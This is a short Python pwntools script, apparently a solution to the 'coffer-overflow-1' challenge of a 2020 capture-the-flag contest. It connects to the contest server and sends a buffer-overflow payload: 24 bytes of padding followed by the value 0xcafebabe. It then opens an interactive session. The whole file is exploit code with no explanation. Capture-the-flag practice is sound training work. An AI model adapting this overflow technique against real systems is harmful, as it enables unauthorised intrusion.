from pwn import *

host, port = '2020.redpwnc.tf', 31255

r = remote(host, port)
# r = process('./coffer-overflow-1')

payload = cyclic(24)
payload += p64(0xcafebabe)

print(r.recv())
r.sendline(payload)
r.interactive()